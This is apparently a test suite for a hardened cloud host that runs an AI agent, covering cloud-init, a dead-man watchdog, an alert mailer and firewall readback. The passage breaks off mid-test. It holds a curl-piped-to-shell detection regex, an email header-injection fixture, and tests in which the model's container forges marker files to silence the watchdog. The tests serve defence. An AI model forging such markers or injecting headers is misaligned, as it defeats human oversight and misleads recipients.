// Build order step 6 (work/rnd/agent/2026-09-05-executive-heron-v2-decided.md section 3), against
// the CTO's spec (2026-09-05-engineering-heron-v2-runtime-and-host.md sections 3-5). Docker stays
// down on this laptop; nothing here builds an image, creates a droplet, or reaches a network. Every
// assertion reads a committed file as text or spawns a local script/fixture -- the same discipline
// test/image.test.mjs and test/tarball.test.mjs already hold this package to.
//
// Derived from packages/agent-runtime/test/host.test.mjs (Heron's) at weir main bfc070e, renamed for
// Wren and pointed at this package's units. The runtime it builds from is the shared one.
// Run: node --test test/host.test.mjs

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, rmSync, utimesSync, readFileSync, readdirSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PKG_DIR = path.join(__dirname, '..');
const DO_DIR = path.join(PKG_DIR, 'digitalocean');
// The mind is shared: the ASCII guard and the runtime live in packages/agent-runtime.
const RUNTIME_DIR = path.join(PKG_DIR, '..', 'agent-runtime');
const CHECK_ASCII = path.join(RUNTIME_DIR, 'scripts', 'check-ascii.py');
const DEPLOY_SCRIPT = path.join(DO_DIR, 'deploy-droplet.sh');
const WATCHDOG = path.join(DO_DIR, 'bin', 'wren-watchdog');
const ALERT = path.join(DO_DIR, 'bin', 'wren-alert');

function renderCloudInit(env = {}) {
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--render-cloud-init'], {
    encoding: 'utf8',
    env: { ...process.env, ...env },
  });
  assert.equal(result.status, 0, `--render-cloud-init failed: ${result.stderr}`);
  return result.stdout;
}

// ---------------------------------------------------------------------------
// 1. The rendered cloud-init is ASCII, YAML-shaped, and carries the required keys.
// ---------------------------------------------------------------------------

test('the rendered cloud-init passes the ASCII guard (checked RENDERED, never the template)', () => {
  const rendered = renderCloudInit();
  const dir = mkdtempSync(path.join(os.tmpdir(), 'host-cloudinit-'));
  try {
    const file = path.join(dir, 'rendered.yaml');
    writeFileSync(file, rendered, 'utf8');
    const result = spawnSync('python3', [CHECK_ASCII, file], { encoding: 'utf8' });
    assert.equal(result.status, 0, `check-ascii.py refused the rendered file: ${result.stderr}`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the rendered cloud-init is YAML-parseable (PyYAML if present, else a minimal structural check)', () => {
  const rendered = renderCloudInit();
  const dir = mkdtempSync(path.join(os.tmpdir(), 'host-cloudinit-yaml-'));
  try {
    const file = path.join(dir, 'rendered.yaml');
    writeFileSync(file, rendered, 'utf8');

    const probe = spawnSync('python3', ['-c', 'import yaml'], { encoding: 'utf8' });
    if (probe.status === 0) {
      const parsed = spawnSync(
        'python3',
        ['-c', `import yaml, sys; yaml.safe_load(open(sys.argv[1]))`, file],
        { encoding: 'utf8' },
      );
      assert.equal(parsed.status, 0, `PyYAML refused the rendered file: ${parsed.stderr}`);
      return;
    }

    // PyYAML is absent on this laptop (verified true as of this step, same as the CTO spec's own
    // finding); a minimal structural check stands in rather than silently skipping the assertion
    // or installing a package as a side effect of running the test suite.
    assert.doesNotMatch(rendered, /\t/, 'cloud-init.yaml must not contain a tab character');
    assert.match(rendered, /^#cloud-config/, 'must open with the #cloud-config marker');
    const lines = rendered.split('\n').filter((l) => l.trim() !== '' && !l.trim().startsWith('#'));
    for (const line of lines) {
      assert.doesNotMatch(line, /^\s*\t/, `indentation uses a tab: ${line}`);
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the rendered cloud-init carries every key build order step 6 requires', () => {
  const rendered = renderCloudInit();
  assert.match(rendered, /disable_root:\s*true/, 'missing disable_root: true');
  assert.match(rendered, /ssh_pwauth:\s*false/, 'missing ssh_pwauth: false');
  assert.match(
    rendered,
    /\/etc\/ssh\/sshd_config\.d\/00-wren\.conf/,
    'missing the 00-wren.conf sshd hardening file (must sort before cloud-init\'s own 50-cloud-init.conf)',
  );
  assert.match(
    rendered,
    /getent passwd 10001/,
    'missing the uid-10001-free assertion (the exact check that would have caught v1\'s uid 999 collision)',
  );
  assert.match(rendered, /docker\.io/, 'missing docker.io from Debian\'s own repository');
  assert.doesNotMatch(
    rendered,
    /curl[^\n]*\|\s*(sh|bash)\b/,
    'a curl-piped-to-shell shape must never appear in cloud-init',
  );
  // "monitoring" is fine as a word in a comment (explaining why do-agent is purged); what must
  // never appear is the YAML KEY, which belongs only in the droplet-create API body
  // (deploy-droplet.sh's create_droplet(), monitoring: False) -- never inside cloud-init itself.
  const nonCommentLines = rendered.split('\n').filter((l) => !l.trim().startsWith('#'));
  for (const line of nonCommentLines) {
    assert.doesNotMatch(
      line,
      /^\s*monitoring\s*:/,
      `cloud-init must never set a "monitoring:" key itself -- that belongs only in the droplet-create API call: ${line}`,
    );
  }
});

// ---------------------------------------------------------------------------
// 2. --plan makes no network call and prints every section the Master reads before create.
// ---------------------------------------------------------------------------

test('--plan runs with no network and exits 0, printing every required section', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'host-plan-'));
  try {
    const doTokenFile = path.join(dir, 'do-token');
    const sshKeyFile = path.join(dir, 'id_ed25519.pub');
    writeFileSync(doTokenFile, 'fake-token-not-real\n', { mode: 0o600 });
    writeFileSync(sshKeyFile, 'ssh-ed25519 AAAAfaketest fake\n', 'utf8');

    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--plan'], {
      encoding: 'utf8',
      env: {
        ...process.env,
        WREN_NO_NETWORK: '1',
        DO_TOKEN_FILE: doTokenFile,
        SSH_PUBLIC_KEY_FILE: sshKeyFile,
      },
    });

    assert.equal(result.status, 0, `--plan failed: ${result.stderr}`);
    const required = [
      '== Droplet',
      '== Firewall',
      '== Host paths',
      '== Credentials this step seals',
      '== What --create does',
      's-1vcpu-512mb-10gb',
      'debian-13-x64',
      'monitoring:  false',
      '/etc/wren/creds',
      'mail-key',
      'systemd-creds encrypt --with-key=host',
    ];
    for (const needle of required) {
      assert.ok(result.stdout.includes(needle), `--plan output is missing: ${needle}`);
    }
    // No value of the fake token ever appears in the plan's own output.
    assert.ok(!result.stdout.includes('fake-token-not-real'));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// 3. --create refuses without WREN_DEPLOY_CONFIRMED=1, before any other input is read.
// ---------------------------------------------------------------------------

test('--create refuses without WREN_DEPLOY_CONFIRMED=1', () => {
  const env = { ...process.env };
  delete env.WREN_DEPLOY_CONFIRMED;
  delete env.DO_TOKEN_FILE;
  delete env.SSH_PUBLIC_KEY_FILE;
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env });
  assert.notEqual(result.status, 0, '--create must refuse with no confirmation env set');
  assert.match(result.stderr, /WREN_DEPLOY_CONFIRMED/);
});

test('--create refuses even with WREN_DEPLOY_CONFIRMED=1 set to the wrong value', () => {
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], {
    encoding: 'utf8',
    env: { ...process.env, WREN_DEPLOY_CONFIRMED: 'yes' },
  });
  assert.notEqual(result.status, 0, 'only the literal value "1" may confirm a create');
});

// ---------------------------------------------------------------------------
// 4. The host-side unit files carry their required directives.
// ---------------------------------------------------------------------------

function unit(name) {
  return readFileSync(path.join(DO_DIR, 'systemd', name), 'utf8');
}

test('wren-watchdog.service triggers the alert unit on failure and runs the watchdog binary', () => {
  const svc = unit('wren-watchdog.service');
  assert.match(svc, /OnFailure=wren-alert@watchdog\.service/);
  assert.match(svc, /ExecStart=\/usr\/local\/sbin\/wren-watchdog\s*$/m);
  assert.match(svc, /Type=oneshot/);
});

test('wren-watchdog.timer runs every 15 minutes and is not enabled by [Install] alone', () => {
  const timer = unit('wren-watchdog.timer');
  assert.match(timer, /OnUnitActiveSec=15min/);
  assert.match(timer, /Persistent=true/);
  assert.match(timer, /WantedBy=timers\.target/);
});

test('wren-alert@.service loads the mail key only through LoadCredentialEncrypted', () => {
  const svc = unit('wren-alert@.service');
  assert.match(svc, /LoadCredentialEncrypted=mail-key:\/etc\/wren\/creds\/mail-key\.cred/);
  assert.match(svc, /ExecStart=\/usr\/local\/sbin\/wren-alert %i/);
  assert.doesNotMatch(svc, /Environment=.*KEY/i, 'the key must never be passed as an Environment=');
});

test('wren-alive.timer fires daily at a fixed hour and points at the alert template', () => {
  const timer = unit('wren-alive.timer');
  assert.match(timer, /OnCalendar=\*-\*-\* \d{2}:00:00 UTC/);
  assert.match(timer, /Unit=wren-alert@alive\.service/);
});

test('wren-retention.service and .timer run the retention binary daily', () => {
  const svc = unit('wren-retention.service');
  const timer = unit('wren-retention.timer');
  assert.match(svc, /ExecStart=\/usr\/local\/sbin\/wren-retention\s*$/m);
  assert.match(timer, /OnCalendar=/);
});

test('wren-retention never removes anything that is not already compressed in archive/ first', () => {
  const script = readFileSync(path.join(DO_DIR, 'bin', 'wren-retention'), 'utf8');

  // Two removals exist in this script and no more: os.remove() for a plain file, after its bytes
  // have been gzipped into archive/, and shutil.rmtree() for a beat directory, after the .tar.gz
  // has been written AND read back and its file count compared against the tree. There is no
  // os.unlink anywhere, and nothing removes anything under archive/ itself.
  assert.doesNotMatch(script, /os\.unlink/);
  assert.equal((script.match(/os\.remove\(/g) ?? []).length, 1, 'exactly one os.remove(), the one after the gzip copy');
  assert.equal((script.match(/shutil\.rmtree\(/g) ?? []).length, 1, 'exactly one shutil.rmtree(), the one after the verified tar.gz');

  // Order is the whole difference between archiving and deleting: the rmtree must come after the
  // read-back that proves the archive holds every file the tree held.
  const verification = script.indexOf('if len(members) != expected:');
  const rmtree = script.indexOf('shutil.rmtree(');
  assert.ok(verification > 0, 'the archive read-back must exist');
  assert.ok(rmtree > verification, 'shutil.rmtree() must come after the archive has been read back and counted');
});

// ---------------------------------------------------------------------------
// 5. The watchdog's 90-minute rule: fires on an old fixture, not on a fresh one.
// ---------------------------------------------------------------------------

function runWatchdog(stateFile, extraEnv = {}) {
  return spawnSync(WATCHDOG, [], {
    encoding: 'utf8',
    env: { ...process.env, WREN_STATE_FILE: stateFile, ...extraEnv },
  });
}

test('the watchdog passes on a fresh state file', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'watchdog-fresh-'));
  try {
    const stateFile = path.join(dir, 'latest.json');
    writeFileSync(stateFile, '{"exit":0}', 'utf8');
    const result = runWatchdog(stateFile);
    assert.equal(result.status, 0, `expected a fresh file to pass: ${result.stderr}`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the watchdog fires (non-zero exit) on a state file older than 90 minutes', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'watchdog-stale-'));
  try {
    const stateFile = path.join(dir, 'latest.json');
    writeFileSync(stateFile, '{"exit":0}', 'utf8');
    const ninetyOneMinutesAgo = new Date(Date.now() - 91 * 60 * 1000);
    utimesSync(stateFile, ninetyOneMinutesAgo, ninetyOneMinutesAgo);
    const result = runWatchdog(stateFile);
    assert.notEqual(result.status, 0, 'a 91-minute-old state file must fire the watchdog');
    assert.match(result.stderr, /past the 5400s ceiling/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the watchdog fires on a state file just under 90 minutes old passing, and just over failing (boundary)', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'watchdog-boundary-'));
  try {
    const stateFile = path.join(dir, 'latest.json');
    writeFileSync(stateFile, '{"exit":0}', 'utf8');

    const justUnder = new Date(Date.now() - 89 * 60 * 1000);
    utimesSync(stateFile, justUnder, justUnder);
    assert.equal(runWatchdog(stateFile).status, 0, '89 minutes old must still pass');

    const justOver = new Date(Date.now() - 91 * 60 * 1000);
    utimesSync(stateFile, justOver, justOver);
    assert.notEqual(runWatchdog(stateFile).status, 0, '91 minutes old must fail');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the watchdog fires on an absent state file', () => {
  const result = runWatchdog('/nonexistent/wren-test-fixture/latest.json');
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /does not exist/);
});

// ---------------------------------------------------------------------------
// 6. The alert script's --dry-run prints the message and never reads a key from the environment.
// ---------------------------------------------------------------------------

test('wren-alert --dry-run prints the message and needs no credential at all', () => {
  const env = { ...process.env };
  delete env.CREDENTIALS_DIRECTORY;
  const result = spawnSync('python3', [ALERT, 'watchdog', '--dry-run'], { encoding: 'utf8', env });
  assert.equal(result.status, 0, `dry-run must succeed with no CREDENTIALS_DIRECTORY: ${result.stderr}`);
  assert.match(result.stdout, /--dry-run/);
  assert.match(result.stdout, /subject: Wren alert: watchdog/);
});

test('wren-alert --dry-run never reads a key-shaped environment variable', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'alert-poison-'));
  try {
    // A poisoned CREDENTIALS_DIRECTORY pointing at a real secret-looking file: if the dry-run
    // branch touched credential_path()/read_key() at all, this value would leak into stdout.
    const credsDir = path.join(dir, 'creds');
    writeFileSync(dir + '/marker', '', 'utf8');
    const result = spawnSync('python3', [ALERT, 'alive', '--dry-run'], {
      encoding: 'utf8',
      env: {
        ...process.env,
        CREDENTIALS_DIRECTORY: credsDir, // deliberately does not exist
        MAIL_KEY: 'THIS-VALUE-MUST-NEVER-APPEAR',
        RESEND_API_KEY: 'THIS-VALUE-MUST-NEVER-APPEAR-EITHER',
      },
    });
    assert.equal(result.status, 0, `dry-run must not fail even with a non-existent creds dir: ${result.stderr}`);
    assert.ok(!result.stdout.includes('THIS-VALUE-MUST-NEVER-APPEAR'));
    assert.ok(!result.stdout.includes('THIS-VALUE-MUST-NEVER-APPEAR-EITHER'));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('wren-alert without --dry-run and without CREDENTIALS_DIRECTORY refuses, naming the rule', () => {
  const env = { ...process.env };
  delete env.CREDENTIALS_DIRECTORY;
  const result = spawnSync('python3', [ALERT, 'watchdog'], { encoding: 'utf8', env });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /CREDENTIALS_DIRECTORY/);
});

test('wren-alert refuses a missing instance argument', () => {
  const result = spawnSync('python3', [ALERT], { encoding: 'utf8' });
  assert.equal(result.status, 2);
  assert.match(result.stderr, /usage/);
});

// ---------------------------------------------------------------------------
// The retention script: 400 fixture files fall under the 200-file / 512 MB ceiling, and nothing
// is ever deleted (moved into archive/ and compressed instead).
// ---------------------------------------------------------------------------

test('retention keeps the newest 200 files and archives (never deletes) the rest', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'retention-'));
  try {
    const now = Date.now();
    for (let i = 0; i < 400; i += 1) {
      const file = path.join(dir, `${String(i).padStart(4, '0')}.log`);
      writeFileSync(file, 'x'.repeat(100), 'utf8');
      const t = new Date(now - (400 - i) * 60 * 1000);
      utimesSync(file, t, t);
    }

    const result = spawnSync(path.join(DO_DIR, 'bin', 'wren-retention'), [], {
      encoding: 'utf8',
      env: { ...process.env, WREN_RUNS_DIR: dir },
    });
    assert.equal(result.status, 0, `retention failed: ${result.stderr}`);

    const remaining = readdirCount(dir, { excludeArchive: true });
    assert.equal(remaining, 200, 'exactly 200 live files should remain');

    const archived = readdirCount(path.join(dir, 'archive'));
    assert.equal(archived, 200, 'the other 200 must be archived, not deleted');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

function readdirCount(dir, { excludeArchive = false } = {}) {
  const entries = readdirSync(dir);
  return entries.filter((name) => !(excludeArchive && name === 'archive')).length;
}

// ===========================================================================
// The fix round after Security's SECOND read-only gate on build order step 6
// (work/rnd/agent/2026-09-05-security-review-heron-v2-step-6-second-read.md):
// N-1 to N-7, the four requirements in section 3, and the step-9 list in section 5.
//
// Same rule as the first round, and it is the rule the whole v2 rebuild exists for: EVERY refusal
// ships with a fixture that makes it fire, and every one below was run against the code as it
// stood before its fix and seen to fail there first. The report for this round quotes those runs.
//
// Nothing here creates anything in any cloud, touches a key, or reaches a network. lib/do_api.py is
// run end to end against an HTTP server this file starts on 127.0.0.1, which is the only reason the
// "created, readback failed, delete it" path is a thing that runs rather than a thing described.
// ===========================================================================

import { createServer } from 'node:http';
import { execFile } from 'node:child_process';
import { mkdirSync, chmodSync, existsSync } from 'node:fs';

const LIB_DIR = path.join(DO_DIR, 'lib');
const DO_API = path.join(LIB_DIR, 'do_api.py');
const FIREWALL_MATCH = path.join(LIB_DIR, 'firewall_match.py');
const POST_BOOT = path.join(LIB_DIR, 'post-boot-assert.sh');
const SMOKE_ASSERT = path.join(LIB_DIR, 'smoke-assert.sh');
const CLOUD_INIT_FILE = path.join(DO_DIR, 'cloud-init.yaml');
const PURSE_SYSTEMD_DIR = path.join(PKG_DIR, 'systemd');

function tmpdir(prefix) {
  return mkdtempSync(path.join(os.tmpdir(), `wren2-${prefix}-`));
}

function plan(env = {}) {
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--plan'], {
    encoding: 'utf8',
    env: { ...process.env, WREN_NO_NETWORK: '1', ...env },
  });
  assert.equal(result.status, 0, `--plan failed: ${result.stderr}`);
  return result.stdout;
}

const deployText = () => readFileSync(DEPLOY_SCRIPT, 'utf8');

// ---------------------------------------------------------------------------
// N-1 (high). The model's container could disarm the dead man permanently.
// ---------------------------------------------------------------------------

/** A stand-in for the two directories that are now two directories. */
function deadManFixture() {
  const dir = tmpdir('deadman');
  const state = path.join(dir, 'state');
  const watchdog = path.join(dir, 'watchdog');
  mkdirSync(state);
  mkdirSync(watchdog);
  const stateFile = path.join(state, 'latest.json');
  return {
    dir,
    state,
    watchdog,
    stateFile,
    stale: (minutes = 91) => {
      writeFileSync(stateFile, '{"exit":0}', 'utf8');
      const then = new Date(Date.now() - minutes * 60 * 1000);
      utimesSync(stateFile, then, then);
    },
    run: (extraEnv = {}) =>
      spawnSync(path.join(DO_DIR, 'bin', 'wren-watchdog'), [], {
        encoding: 'utf8',
        env: {
          ...process.env,
          WREN_STATE_FILE: stateFile,
          WREN_WATCHDOG_DIR: watchdog,
          ...extraEnv,
        },
      }),
  };
}

test('N-1: a forged marker in the CONTAINER-WRITABLE state directory no longer silences the notice', () => {
  const f = deadManFixture();
  try {
    f.stale();
    // Exactly what Security demonstrated against the shipped binary: /srv/wren/state is 2770
    // root:wren and run-flags.txt mounts it read-write into the container as uid 10001, the group
    // that owns it. This is the file the container can write, in the directory it can write.
    writeFileSync(path.join(f.state, 'degraded'), 'since=1\nlast_notified=99999999999\n', 'utf8');
    writeFileSync(path.join(f.state, 'alerts.jsonl'), '{"event":"recovered"}\n', 'utf8');

    const result = f.run();
    assert.notEqual(
      result.status,
      0,
      'a host that has stopped beating must ask for a notice, whatever the container wrote',
    );
    assert.doesNotMatch(result.stderr, /notice already sent/, 'the forged marker must not be read at all');
    assert.match(result.stderr, /past the 5400s ceiling/);
    // And the real record went to the root-only directory, not to the one the container holds.
    assert.ok(existsSync(path.join(f.watchdog, 'degraded')), 'the marker belongs in the root-only directory');
    assert.ok(existsSync(path.join(f.watchdog, 'alerts.jsonl')), 'so does the record');
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('N-1: a last_notified in the FUTURE is read as "never notified", so the notice is due', () => {
  const f = deadManFixture();
  try {
    f.stale();
    writeFileSync(path.join(f.watchdog, 'degraded'), 'since=1\nlast_notified=99999999999\n', 'utf8');
    const result = f.run();
    assert.notEqual(result.status, 0, 'a marker that claims a notice was sent in the future must not suppress one');
    assert.match(result.stderr, /which is in the future/);
    assert.doesNotMatch(result.stderr, /next notice in -/, 'SILENT_FOR must never be negative');
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('N-1: a marker field that is not a run of digits is read as absent', () => {
  const f = deadManFixture();
  try {
    f.stale();
    writeFileSync(path.join(f.watchdog, 'degraded'), 'since=whenever\nlast_notified=soon\n', 'utf8');
    const result = f.run();
    assert.notEqual(result.status, 0, 'a corrupted marker must make the notice DUE, never suppressed');
    assert.match(result.stderr, /is not a run of digits/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('N-1: the watchdog directory is created 0700 root:root, printed by --plan, and asserted after boot', () => {
  const yaml = readFileSync(CLOUD_INIT_FILE, 'utf8');
  assert.match(
    yaml,
    /- \[ install, -d, -m, "0700", -o, root, -g, root, \/var\/lib\/wren\/watchdog \]/,
    'cloud-init never creates the watchdog directory',
  );
  assert.match(plan(), /\/var\/lib\/wren\/watchdog\s+0700 root:root/, '--plan never names it');
  assert.match(
    readFileSync(POST_BOOT, 'utf8'),
    /\(f"\{var\}\/watchdog",\s+0o700, "root",\s+"root"\)/,
    'the post-boot check never asserts it',
  );
});

// ---------------------------------------------------------------------------
// N-2 (medium). The same directory fed text into the Master's mailbox.
// ---------------------------------------------------------------------------

function alertDryRun(instance, env = {}) {
  return spawnSync('python3', [ALERT, instance, '--dry-run'], {
    encoding: 'utf8',
    env: { ...process.env, ...env },
  });
}

test('N-2: the alert REFUSES to read an alerts file under /srv/wren, whatever it is pointed at', () => {
  const result = alertDryRun('watchdog', { WREN_ALERTS_FILE: '/srv/wren/state/alerts.jsonl' });
  assert.equal(result.status, 0, 'the notice must still go out');
  assert.match(result.stderr, /refused to read \/srv\/wren\/state\/alerts\.jsonl/);
  assert.match(result.stderr, /the model's container can write/);
  // And the body is the generic one, worded from the instance alone.
  assert.match(result.stdout, /subject: Wren alert: watchdog/);
});

test('N-2: a record the watchdog did write is quoted, but only as one line of printable ASCII', () => {
  const dir = tmpdir('alertbody');
  try {
    const alerts = path.join(dir, 'alerts.jsonl');
    writeFileSync(
      alerts,
      `${JSON.stringify({
        event: 'stale',
        stale_since: '1757000000',
        detail: 'latest.json is old\nFrom: not-wren@example.invalid\nSubject: transfer the funds',
      })}\n`,
      'utf8',
    );
    const result = alertDryRun('watchdog', { WREN_ALERTS_FILE: alerts });
    assert.equal(result.status, 0, result.stderr);
    assert.match(
      result.stdout,
      /Detail: latest\.json is old From: not-wren@example\.invalid Subject: transfer the funds/,
    );
    const detailLine = result.stdout.split('\n').filter((l) => l.startsWith('Detail:'))[0];
    assert.doesNotMatch(detailLine, /[^\u0020-\u007e]/, 'only printable ASCII may reach the body');
    assert.equal(result.stdout.split('\n').filter((l) => l.startsWith('Detail:')).length, 1, 'a quoted value may never become more than one line');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N-2: the watchdog writes and the alert reads the same root-only directory, by default', () => {
  const watchdog = readFileSync(WATCHDOG, 'utf8');
  const alert = readFileSync(ALERT, 'utf8');
  assert.match(watchdog, /WATCHDOG_DIR="\$\{WREN_WATCHDOG_DIR:-\/var\/lib\/wren\/watchdog\}"/);
  assert.match(
    alert,
    /ALERTS_FILE = os\.environ\.get\("WREN_ALERTS_FILE", "\/var\/lib\/wren\/watchdog\/alerts\.jsonl"\)/,
  );
  assert.doesNotMatch(watchdog, /STATE_DIR/, 'the marker must not be derived from the state file any more');
});

// ---------------------------------------------------------------------------
// N-3 (medium). The firewall readback ignored a widened source.
// ---------------------------------------------------------------------------

const ASKED = {
  inbound_rules: [{ protocol: 'tcp', ports: '22', sources: { addresses: ['203.0.113.4'] } }],
  outbound_rules: [
    { protocol: 'tcp', ports: '443', destinations: { addresses: ['0.0.0.0/0', '::/0'] } },
    { protocol: 'tcp', ports: '53', destinations: { addresses: ['0.0.0.0/0', '::/0'] } },
    { protocol: 'udp', ports: '53', destinations: { addresses: ['0.0.0.0/0', '::/0'] } },
  ],
};

function echoOf({ inboundSources } = {}) {
  const side = (addresses) => ({ addresses, droplet_ids: [], tags: [], load_balancer_uids: [] });
  return {
    id: 'fw-1',
    name: 'wren-first-fw',
    tags: ['wren-v2'],
    inbound_rules: [{ protocol: 'tcp', ports: '22', sources: inboundSources ?? side(['203.0.113.4']) }],
    outbound_rules: [
      { protocol: 'tcp', ports: '443', destinations: side(['::/0', '0.0.0.0/0']) },
      { protocol: 'udp', ports: '53', destinations: side(['0.0.0.0/0', '::/0']) },
      { protocol: 'tcp', ports: '53', destinations: side(['::/0', '0.0.0.0/0']) },
    ],
  };
}

function matchFirewall(requested, readback) {
  const dir = tmpdir('fwmatch');
  try {
    const a = path.join(dir, 'requested.json');
    const b = path.join(dir, 'readback.json');
    writeFileSync(a, JSON.stringify(requested), 'utf8');
    writeFileSync(b, JSON.stringify(readback), 'utf8');
    return spawnSync('python3', [FIREWALL_MATCH, a, b], { encoding: 'utf8' });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test('N-3: an echo whose inbound source carries tags is a MISMATCH -- a whole tag admitted on 22', () => {
  const result = matchFirewall(ASKED, {
    firewall: echoOf({
      inboundSources: {
        addresses: ['203.0.113.4'],
        droplet_ids: [],
        tags: ['wren-v2'],
        load_balancer_uids: [],
      },
    }),
  });
  assert.equal(result.status, 1, 'an inbound rule admitting a whole tag on 22 must be refused');
  assert.match(result.stderr, /tags=\[wren-v2\]/);
  assert.match(result.stderr, /must be empty/);
});

test('N-3: an echo whose inbound source carries droplet_ids is a MISMATCH', () => {
  const result = matchFirewall(ASKED, {
    firewall: echoOf({
      inboundSources: {
        addresses: ['203.0.113.4'],
        droplet_ids: [12345678],
        tags: [],
        load_balancer_uids: [],
      },
    }),
  });
  assert.equal(result.status, 1);
  assert.match(result.stderr, /droplet_ids=\[12345678\]/);
});

test('N-3: a correct DigitalOcean echo -- all four keys, all three lists empty -- still MATCHES', () => {
  const result = matchFirewall(ASKED, { firewall: echoOf() });
  assert.equal(result.status, 0, `a correct firewall was refused: ${result.stderr}`);
  assert.match(result.stdout, /load_balancer_uids empty in every rule/);
});

test('N-3: the docstring no longer says the three lists are deliberately ignored', () => {
  const text = readFileSync(FIREWALL_MATCH, 'utf8');
  assert.doesNotMatch(text, /deliberately ignored: droplet_ids/);
  assert.doesNotMatch(text, /the create body's own droplet_ids/, 'the create body does not send droplet_ids at all');
});

// ---------------------------------------------------------------------------
// N-4 (medium). The firewall was created before the rollback trap was armed.
// ---------------------------------------------------------------------------

/**
 * An HTTP server on 127.0.0.1 that answers like DigitalOcean. This is how the one path that
 * matters -- POST succeeded, readback did not match, now what -- is RUN rather than described.
 * No account, no token, no network beyond the loopback interface.
 */
async function doServer(handlers) {
  const seen = [];
  const server = createServer((req, res) => {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
    });
    req.on('end', () => {
      seen.push(`${req.method} ${req.url}`);
      const answer = handlers(req.method, req.url, body);
      if (answer === null) {
        res.writeHead(204).end();
        return;
      }
      res.writeHead(answer.status ?? 200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(answer.body ?? {}));
    });
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address();
  return {
    seen,
    base: `http://127.0.0.1:${port}`,
    close: () => new Promise((resolve) => server.close(resolve)),
  };
}

/**
 * ASYNC on purpose. spawnSync blocks node's one thread, so the server started above -- which lives
 * in this same process -- could never answer the call, and every request timed out after thirty
 * seconds. execFile leaves the event loop free to serve it.
 */
function runApi(args, base, extraEnv = {}) {
  return new Promise((resolve) => {
    execFile(
      'python3',
      [DO_API, ...args],
      { encoding: 'utf8', env: { ...process.env, WREN_DO_API_BASE: base, ...extraEnv } },
      (error, stdout, stderr) => resolve({ status: error ? (error.code ?? 1) : 0, stdout, stderr }),
    );
  });
}

function tokenFile(dir) {
  const file = path.join(dir, 'do-token');
  writeFileSync(file, 'not-a-real-token\n', { mode: 0o600 });
  chmodSync(file, 0o600);
  return file;
}

test('N-4: a firewall whose readback is widened is DELETED by the very call that created it', async () => {
  const dir = tmpdir('fwcreate');
  const widened = echoOf({
    inboundSources: {
      addresses: ['203.0.113.4'],
      droplet_ids: [],
      tags: ['wren-v2'],
      load_balancer_uids: [],
    },
  });
  const server = await doServer((method, url) => {
    if (method === 'POST' && url === '/v2/tags') return { status: 201, body: { tag: { name: 'wren-v2' } } }; // the tag must exist before a firewall targets it
    if (method === 'POST' && url === '/v2/firewalls') return { status: 201, body: { firewall: widened } };
    if (method === 'GET' && url === '/v2/firewalls/fw-1') return { body: { firewall: widened } };
    if (method === 'DELETE' && url === '/v2/firewalls/fw-1') return null;
    return { status: 404, body: {} };
  });
  try {
    const idFile = path.join(dir, 'firewall-id');
    const result = await runApi(
      [
        'firewall-create',
        tokenFile(dir),
        '203.0.113.4',
        'wren-first',
        'wren-v2',
        FIREWALL_MATCH,
        '--id-file',
        idFile,
      ],
      server.base,
    );
    assert.equal(result.status, 1, 'a widened readback must fail the create');
    assert.ok(
      server.seen.includes('DELETE /v2/firewalls/fw-1'),
      `the firewall it made was left on the account. Calls seen: ${server.seen.join(', ')}`,
    );
    assert.match(result.stderr, /firewall fw-1 deleted/);
    // And the id was written down before any of that could fail.
    assert.equal(
      readFileSync(idFile, 'utf8').trim(),
      'fw-1',
      'the id must reach the id file the moment the POST returns',
    );
  } finally {
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N-4: a firewall whose readback matches is kept, and its id is printed', async () => {
  const dir = tmpdir('fwok');
  const good = echoOf();
  const server = await doServer((method, url) => {
    if (method === 'POST' && url === '/v2/tags') return { status: 201, body: { tag: { name: 'wren-v2' } } }; // the tag must exist before a firewall targets it
    if (method === 'POST' && url === '/v2/firewalls') return { status: 201, body: { firewall: good } };
    if (method === 'GET' && url === '/v2/firewalls/fw-1') return { body: { firewall: good } };
    return { status: 404, body: {} };
  });
  try {
    const idFile = path.join(dir, 'firewall-id');
    const result = await runApi(
      [
        'firewall-create',
        tokenFile(dir),
        '203.0.113.4',
        'wren-first',
        'wren-v2',
        FIREWALL_MATCH,
        '--id-file',
        idFile,
      ],
      server.base,
    );
    assert.equal(result.status, 0, `a correct firewall was refused: ${result.stderr}`);
    assert.equal(result.stdout.trim(), 'fw-1');
    assert.ok(!server.seen.some((c) => c.startsWith('DELETE')), 'a correct firewall must not be deleted');
  } finally {
    await server.close();
